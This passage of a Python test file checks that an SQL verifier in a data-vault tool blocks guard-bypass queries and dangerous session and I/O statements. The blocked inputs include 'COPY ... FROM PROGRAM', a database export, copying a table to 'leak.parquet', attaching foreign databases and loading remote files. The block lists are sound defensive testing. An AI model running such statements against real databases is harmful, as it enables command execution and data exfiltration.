        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT (SELECT MAX(hk_issuer) FROM staging.s), CURRENT_TIMESTAMP, 'SRC', 'x'",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) VALUES ((SELECT MAX(hk_issuer) FROM staging.s), CURRENT_TIMESTAMP, 'SRC', 'x')",
    )
    sat_allowed_controls = (
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT b.hk_issuer, b.load_dts, 'SRC', b.hd FROM staging.s AS b LEFT JOIN (SELECT hk_issuer, MAX(load_dts) AS max_dts FROM staging.s GROUP BY hk_issuer) AS cur ON b.hk_issuer = cur.hk_issuer",
        "UPDATE staging.s SET x = 1 FROM staging.s AS s, LATERAL (SELECT hk_issuer FROM raw_vault.hub_issuer) AS h",
    )

    any_rhs_blocked_sqls = (
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN FALSE = ANY(s.hk = 'x') THEN 'EVIL' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN FALSE = ANY((s.hk = 'x')) THEN 'EVIL' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN TRUE = ANY(s.hk IS NULL) THEN 'EVIL' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN FALSE = ANY(s.a AND s.b) THEN 'EVIL' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
    )
    any_rhs_allowed_controls = (
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' AND s.hk = ANY(ARRAY['a', 'b'])",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' AND s.hk = ANY(SELECT x.hk FROM staging.x AS x)",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' AND 'a' = ANY(s.arr_col)",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' AND s.hk = ANY(s.arr_col)",
    )

    session_io_blocked_sqls = (
        "PRAGMA enable_external_access = true",
        "PRAGMA threads = 1",
        "USE raw_vault",
        "EXPORT DATABASE '/tmp/dump'",
        "INSTALL httpfs",
        "FORCE INSTALL httpfs",
        "LOAD httpfs",
        "RESET Threads",
        "RESET ALL",
        "ATTACH ':memory:' AS evil",
        "ATTACH 'evil.db' AS staging",
        "COPY (SELECT 1) TO 'evil.parquet'",
        "COPY raw_vault.sat_issuer_core TO 'leak.parquet'",
        "COPY staging.s FROM 'evil.parquet'",
        "COPY INTO staging.s FROM '@stage/evil.csv'",
    )

    for tid in SQL_TARGET_IDS:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        for sat_sql in sat_blocked_sqls:
            s_diags = verifier.verify_sql(sat_sql, tid)
            assert any(d.rule_id == "DV-AST-006" and d.severity == "BLOCKER" for d in s_diags), (
                tid,
                sat_sql,
                s_diags,
            )
            with pytest.raises(OpenDVError) as exc_s:
                gate.verify_sql_ast(tid, sat_sql, ir=ir)
            assert exc_s.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_s.value.exit_code == 50

        for ok_sat in sat_allowed_controls:
            assert verifier.verify_sql(ok_sat, tid) == [], (tid, ok_sat)
            assert gate.verify_sql_ast(tid, ok_sat, ir=ir) == [], (tid, ok_sat)

        for bad_u_sql in any_rhs_blocked_sqls:
            u_diags = verifier.verify_sql(bad_u_sql, tid, extra_unstructured_links=["lnk_u"])
            assert any(d.rule_id == "DV-AST-007" and d.severity == "BLOCKER" for d in u_diags), (
                tid,
                bad_u_sql,
                u_diags,
            )
            assert has_steward_approved_guard(sqlglot.parse_one(bad_u_sql, read=dialect)) is False, (
                tid,
                bad_u_sql,
            )
            with pytest.raises(OpenDVError) as exc_u:
                gate.verify_sql_ast(tid, bad_u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
            assert exc_u.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_u.value.exit_code == 50

        for ok_rhs in any_rhs_allowed_controls:
            if tid in ("clickhouse", "sqlserver_fabric") and "ANY(ARRAY" in ok_rhs:
                continue
            if tid == "clickhouse" and "= ANY(s.arr_col)" in ok_rhs:
                continue
            assert verifier.verify_sql(ok_rhs, tid, extra_unstructured_links=["lnk_u"]) == [], (
                tid,
                ok_rhs,
            )
            assert gate.verify_sql_ast(
                tid, ok_rhs.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct
            ) == [], (tid, ok_rhs)

        for io_sql in session_io_blocked_sqls:
            io_diags = verifier.verify_sql(io_sql, tid)
            assert any(d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER" for d in io_diags), (
                tid,
                io_sql,
                io_diags,
            )
            with pytest.raises(OpenDVError) as exc_io:
                gate.verify_sql_ast(tid, io_sql, ir=ir)
            assert exc_io.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_io.value.exit_code == 50


def test_iter25_parenthesized_joins_subq_left_join_any_rhs_and_copy_put_parity() -> None:
    """Block Iter-25 DV-AST-006, DV-AST-007 ANY(pred/bool), and Snowflake COPY/PUT across 8/8 dialects."""
    from opendv.storage._steward_guard import has_steward_approved_guard

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={"link_name": "lnk_doc_claim", "link_kind": "UNSTRUCTURED_EXTRACTION_LINK"}
                ),
            ]
        }
    )

    sat_blocked_sqls = (
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, sub.load_dts, 'SRC', sub.hash_diff FROM (staging.s AS s RIGHT JOIN (SELECT MAX(hk_issuer) AS hk_issuer, MAX(load_dts) AS load_dts, MAX(hash_diff) AS hash_diff FROM staging.s) AS sub ON 1=0)",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, sub.load_dts, 'SRC', sub.hash_diff FROM (staging.s AS s INNER JOIN (SELECT MAX(hk_issuer) AS hk_issuer, MAX(load_dts) AS load_dts, MAX(hash_diff) AS hash_diff FROM staging.s) AS sub ON 1=1)",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, sub.load_dts, 'SRC', sub.hash_diff FROM (staging.s AS s LEFT JOIN (SELECT MAX(hk_issuer) AS hk_issuer, MAX(load_dts) AS load_dts, MAX(hash_diff) AS hash_diff FROM staging.s) AS sub ON 1=1)",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, sub.load_dts, 'SRC', sub.hash_diff FROM (staging.s AS s, (SELECT MAX(hk_issuer) AS hk_issuer, MAX(load_dts) AS load_dts, MAX(hash_diff) AS hash_diff FROM staging.s) AS sub)",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT (SELECT MAX(hk_issuer) FROM staging.s), CURRENT_TIMESTAMP, 'SRC', 'x' FROM raw_vault.hub_issuer AS h",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT (SELECT MAX(hk_issuer) FROM staging.s), CURRENT_TIMESTAMP, 'SRC', 'x' FROM (SELECT 1 AS k) AS d",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT (SELECT MAX(hk_issuer) FROM staging.s), CURRENT_TIMESTAMP, 'SRC', 'x' FROM (VALUES (1)) AS v(x)",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT 'x', CURRENT_TIMESTAMP, 'SRC', 'h' FROM (SELECT 1 AS k) AS d WHERE EXISTS (SELECT MAX(hk_issuer) FROM staging.s)",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT 'x', CURRENT_TIMESTAMP, 'SRC', 'h' FROM (SELECT 1 AS k) AS d WHERE EXISTS (SELECT 1 FROM staging.s HAVING COUNT(*) >= 0)",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT 'x', CURRENT_TIMESTAMP, 'SRC', 'y' WHERE (SELECT COUNT(*) FROM staging.s) = 0",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT s.hk_issuer, s.load_dts, 'SRC', s.hd FROM staging.s AS s QUALIFY (SELECT COUNT(*) FROM staging.s) > 0",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT s.hk_issuer, s.load_dts, 'SRC', CAST((SELECT SUM(n) FROM staging.s) AS VARCHAR) FROM staging.s AS s",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, sub.load_dts, 'SRC', sub.hash_diff FROM (SELECT 1 AS k) AS d LEFT JOIN (SELECT MAX(hk_issuer) AS hk_issuer, MAX(load_dts) AS load_dts, MAX(hash_diff) AS hash_diff FROM staging.s) AS sub ON 1=1",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, sub.load_dts, 'SRC', sub.hash_diff FROM raw_vault.hub_issuer AS h LEFT JOIN (SELECT MAX(hk_issuer) AS hk_issuer, MAX(load_dts) AS load_dts, MAX(hash_diff) AS hash_diff FROM staging.s) AS sub ON 1=1",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, sub.load_dts, 'SRC', sub.hash_diff FROM staging.s AS d LEFT JOIN LATERAL (SELECT MAX(hk_issuer) AS hk_issuer, MAX(load_dts) AS load_dts, MAX(hash_diff) AS hash_diff FROM staging.s) AS sub ON TRUE",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, sub.load_dts, 'SRC', sub.hash_diff FROM staging.s AS d NATURAL LEFT JOIN (SELECT MAX(hk_issuer) AS hk_issuer, MAX(load_dts) AS load_dts, MAX(hash_diff) AS hash_diff FROM staging.s) AS sub",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, sub.load_dts, 'SRC', sub.hash_diff FROM staging.s AS d LEFT JOIN (WITH agg AS (SELECT MAX(hk_issuer) AS hk_issuer FROM staging.s) SELECT hk_issuer, CURRENT_TIMESTAMP AS load_dts, 'x' AS hash_diff FROM agg GROUP BY hk_issuer) AS sub ON TRUE",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, sub.load_dts, 'SRC', sub.hash_diff FROM staging.s AS d LEFT JOIN (SELECT hk_issuer, MAX(load_dts) AS load_dts, MAX(hash_diff) AS hash_diff FROM staging.s GROUP BY hk_issuer HAVING COUNT(*) > 0) AS sub ON TRUE",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, sub.load_dts, 'SRC', sub.hash_diff FROM staging.s AS d LEFT JOIN (SELECT hk_issuer, MAX(load_dts) AS load_dts, MAX(hash_diff) AS hash_diff FROM staging.s GROUP BY ()) AS sub ON TRUE",
    )
    unnest_sql = "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT (SELECT MAX(hk_issuer) FROM staging.s), CURRENT_TIMESTAMP, 'SRC', 'x' FROM UNNEST([1]) AS u"

    sat_allowed_controls = (
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT b.hk_issuer, b.load_dts, 'SRC', b.hd FROM staging.s AS b LEFT JOIN (SELECT hk_issuer, MAX(load_dts) AS max_dts FROM staging.s GROUP BY hk_issuer) AS cur ON b.hk_issuer = cur.hk_issuer",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT b.hk_issuer, b.load_dts, 'SRC', b.hd FROM staging.s AS b LEFT JOIN (SELECT hk_issuer, hash_diff, ROW_NUMBER() OVER (PARTITION BY hk_issuer ORDER BY load_dts DESC) AS _lrn FROM raw_vault.sat_issuer_core) AS cur ON b.hk_issuer = cur.hk_issuer AND cur._lrn = 1",
        "UPDATE staging.s SET x = 1 FROM staging.s AS s, LATERAL (SELECT hk_issuer FROM raw_vault.hub_issuer) AS h",
    )

    any_rhs_blocked_sqls = (
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN FALSE = ANY(EXISTS (SELECT 1 FROM staging.s WHERE s.hk = 'x')) THEN 'EVIL' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN FALSE = ANY(s.b) THEN 'EVIL' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN TRUE = ANY(s.b) THEN 'EVIL' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN FALSE = ANY(CASE WHEN s.hk = 'x' THEN TRUE ELSE FALSE END) THEN 'EVIL' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN FALSE = ANY(COALESCE(s.b, FALSE)) THEN 'EVIL' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN FALSE = ANY(REGEXP_LIKE(s.hk, 'x')) THEN 'EVIL' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN s.hk = ANY(REGEXP_LIKE(s.hk, 'x')) THEN 'EVIL' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
    )
    any_rhs_allowed_controls = (
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' AND s.hk = ANY(ARRAY['a', 'b'])",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' AND s.hk = ANY(SELECT x.hk FROM staging.x AS x)",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' AND 'a' = ANY(s.arr_col)",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' AND s.hk = ANY(s.arr_col)",
    )

    copy_put_blocked_sqls = (
        "COPY staging.s FROM PROGRAM 'id'",
        "COPY staging.s FROM STDIN",
        "PUT file:///tmp/a @stage",
    )

    for tid in SQL_TARGET_IDS:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        for sat_sql in (*sat_blocked_sqls, unnest_sql):
            s_diags = verifier.verify_sql(sat_sql, tid)
            assert any(d.rule_id == "DV-AST-006" and d.severity == "BLOCKER" for d in s_diags), (
                tid,
                sat_sql,
                s_diags,
            )
            with pytest.raises(OpenDVError) as exc_s:
                gate.verify_sql_ast(tid, sat_sql, ir=ir)
            assert exc_s.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_s.value.exit_code == 50

        for ok_sat in sat_allowed_controls:
            assert verifier.verify_sql(ok_sat, tid) == [], (tid, ok_sat)
            assert gate.verify_sql_ast(tid, ok_sat, ir=ir) == [], (tid, ok_sat)

        for bad_u_sql in any_rhs_blocked_sqls:
            u_diags = verifier.verify_sql(bad_u_sql, tid, extra_unstructured_links=["lnk_u"])
            assert any(d.rule_id == "DV-AST-007" and d.severity == "BLOCKER" for d in u_diags), (
                tid,
                bad_u_sql,
                u_diags,
            )
            assert has_steward_approved_guard(sqlglot.parse_one(bad_u_sql, read=dialect)) is False, (
                tid,
                bad_u_sql,
            )
            with pytest.raises(OpenDVError) as exc_u:
                gate.verify_sql_ast(tid, bad_u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
            assert exc_u.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_u.value.exit_code == 50

        for ok_rhs in any_rhs_allowed_controls:
            if tid in ("clickhouse", "sqlserver_fabric") and "ANY(ARRAY" in ok_rhs:
                continue
            if tid == "clickhouse" and "= ANY(s.arr_col)" in ok_rhs:
                continue
            assert verifier.verify_sql(ok_rhs, tid, extra_unstructured_links=["lnk_u"]) == [], (
                tid,
                ok_rhs,
            )
            assert gate.verify_sql_ast(
                tid, ok_rhs.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct
            ) == [], (tid, ok_rhs)

        for io_sql in copy_put_blocked_sqls:
            io_diags = verifier.verify_sql(io_sql, tid)
            assert any(d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER" for d in io_diags), (
                tid,
                io_sql,
                io_diags,
            )
            with pytest.raises(OpenDVError) as exc_io:
                gate.verify_sql_ast(tid, io_sql, ir=ir)
            assert exc_io.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_io.value.exit_code == 50


def test_iter26_window_agg_clauses_left_join_any_lhs_rhs_and_stage_load_parity() -> None:
    """Block Iter-26 DV-AST-006, DV-AST-007 ANY(), and Snowflake/LoadData EVAL-AST-01 across 8/8 dialects."""
    from opendv.storage._steward_guard import has_steward_approved_guard

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={"link_name": "lnk_doc_claim", "link_kind": "UNSTRUCTURED_EXTRACTION_LINK"}
                ),
            ]
        }
    )

    sat_blocked_sqls = (
        # 1. Window-wrapped scalar aggregates
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT CAST(SUM(MAX(s.n)) OVER () AS VARCHAR), CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT CAST(ROW_NUMBER() OVER (ORDER BY MAX(s.n)) AS VARCHAR), CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT CAST(SUM(s.n) OVER (PARTITION BY MAX(s.k)) AS VARCHAR), CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT CAST(SUM(s.n) FILTER (WHERE MAX(s.x) > 0) OVER () AS VARCHAR), CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s",
        # 2. Uninspected SQL clauses (JOIN ON, ORDER BY, LIMIT, OFFSET, DISTINCT ON, GROUP BY subq, MERGE ON/WHEN)
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT h.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM raw_vault.hub_issuer AS h INNER JOIN (VALUES (1)) AS v(x) ON EXISTS (SELECT MAX(hk_issuer) FROM staging.s)",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT h.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM raw_vault.hub_issuer AS h LEFT JOIN staging.s AS s ON s.hk_issuer = (SELECT MAX(hk_issuer) FROM staging.s)",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT h.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM raw_vault.hub_issuer AS h ORDER BY (SELECT MAX(hk_issuer) FROM staging.s)",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT h.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM raw_vault.hub_issuer AS h LIMIT (SELECT COUNT(*) + 1 FROM staging.s)",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT h.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM raw_vault.hub_issuer AS h OFFSET (SELECT COUNT(*) FROM staging.s)",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT DISTINCT ON ((SELECT MAX(hk_issuer) FROM staging.s)) h.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM raw_vault.hub_issuer AS h",
        "MERGE INTO raw_vault.sat_issuer_core AS t USING raw_vault.hub_issuer AS h ON t.hk_issuer = (SELECT MAX(hk_issuer) FROM staging.s) WHEN NOT MATCHED THEN INSERT (hk_issuer, load_dts, rec_src, hash_diff) VALUES (h.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x')",
        "MERGE INTO raw_vault.sat_issuer_core AS t USING raw_vault.hub_issuer AS h ON 1=0 WHEN NOT MATCHED AND (SELECT COUNT(*) FROM staging.s) >= 0 THEN INSERT (hk_issuer, load_dts, rec_src, hash_diff) VALUES (h.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x')",
        "MERGE INTO raw_vault.sat_issuer_core AS t USING staging.s AS s ON t.hk_issuer = s.hk_issuer WHEN NOT MATCHED THEN INSERT (hk_issuer, load_dts, rec_src, hash_diff) VALUES ((SELECT MAX(hk_issuer) FROM staging.s), CURRENT_TIMESTAMP, 'SRC', 'x')",
        # 3. _is_safe_grouped_left_join bypasses (constant GROUP BY, constant FROM, VALUES FROM, constant CTE)
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM raw_vault.hub_issuer AS h LEFT JOIN (SELECT MAX(hk_issuer) AS hk_issuer FROM staging.s GROUP BY 'const') AS sub ON 1=1",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM raw_vault.hub_issuer AS h LEFT JOIN (SELECT MAX(v.x) AS hk_issuer FROM (VALUES ('z')) AS v(x) GROUP BY v.x) AS sub ON 1=1",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT COALESCE(sub.hk_issuer, 'evil'), CURRENT_TIMESTAMP, 'SRC', 'h' FROM (SELECT 1 AS k) AS d LEFT JOIN (SELECT hk_issuer, MAX(load_dts) AS load_dts FROM staging.s GROUP BY hk_issuer) AS sub ON 1=1",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS d LEFT JOIN (SELECT MAX(hk_issuer) AS hk_issuer FROM (SELECT 1 AS k) AS c GROUP BY c.k) AS sub ON 1=1",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) WITH c AS (SELECT 1 AS k) SELECT sub.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM c LEFT JOIN (SELECT hk_issuer, MAX(load_dts) AS max_dts FROM staging.s GROUP BY hk_issuer) AS sub ON 1=1",
    )

    sat_allowed_controls = (
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT b.hk_issuer, b.load_dts, 'SRC', b.hd FROM staging.s AS b LEFT JOIN (SELECT hk_issuer, MAX(load_dts) AS max_dts FROM staging.s GROUP BY hk_issuer) AS cur ON b.hk_issuer = cur.hk_issuer",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT b.hk_issuer, b.load_dts, 'SRC', b.hd FROM staging.s AS b LEFT JOIN (SELECT hk_issuer, hash_diff, ROW_NUMBER() OVER (PARTITION BY hk_issuer ORDER BY load_dts DESC) AS _lrn FROM raw_vault.sat_issuer_core) AS cur ON b.hk_issuer = cur.hk_issuer AND cur._lrn = 1",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT b.hk_issuer, b.load_dts, 'SRC', CAST(SUM(b.n) OVER (PARTITION BY b.hk_issuer ORDER BY b.load_dts) AS VARCHAR) FROM staging.s AS b",
        "UPDATE staging.s SET x = 1 FROM staging.s AS s, LATERAL (SELECT hk_issuer FROM raw_vault.hub_issuer) AS h",
    )

    any_blocked_sqls = (
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN (1 = 0) = ANY(s.b) THEN 'EVIL' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN NULL = ANY(s.b) THEN 'EVIL' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN CAST(0 AS BOOLEAN) = ANY(s.b) THEN 'EVIL' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN (NOT TRUE) = ANY(s.b) THEN 'EVIL' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN (TRUE AND FALSE) = ANY(s.b) THEN 'EVIL' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN COALESCE(FALSE, FALSE) = ANY(s.b) THEN 'EVIL' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN (s.hk = 'a') = ANY(s.b) THEN 'EVIL' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN (1 = 0) = ANY(COALESCE(s.b, s.c)) THEN 'EVIL' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN 1 = ANY(CASE WHEN s.b THEN 1 ELSE 0 END) THEN 'EVIL' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN 1 = ANY(IF(s.c, 1, 0)) THEN 'EVIL' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN s.b = ANY(REGEXP_CONTAINS(s.hk, 'x')) THEN 'EVIL' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
    )
    any_allowed_controls = (
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' AND s.hk = ANY(ARRAY['a', 'b'])",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' AND s.hk = ANY(SELECT x.hk FROM staging.x AS x)",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' AND 'a' = ANY(s.arr_col)",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' AND s.hk = ANY(s.arr_col)",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' AND CASE WHEN s.x = 1 THEN 'a' ELSE 'b' END = ANY(s.arr_col)",
    )

    io_blocked_sqls = (
        "LIST @stage",
        "LS @stage",
        "CREATE STAGE my_stage URL='s3://bucket/'",
        "CREATE OR REPLACE STAGE my_stage URL='s3://bucket/'",
        "CREATE EXTERNAL TABLE staging.ext (id INT) LOCATION 's3://b/'",
        "LOAD DATA OVERWRITE staging.s FROM FILES(format='PARQUET', uris=['gs://b/*.parquet'])",
        "LOAD DATA INPATH '/tmp/evil.csv' INTO TABLE staging.s",
    )

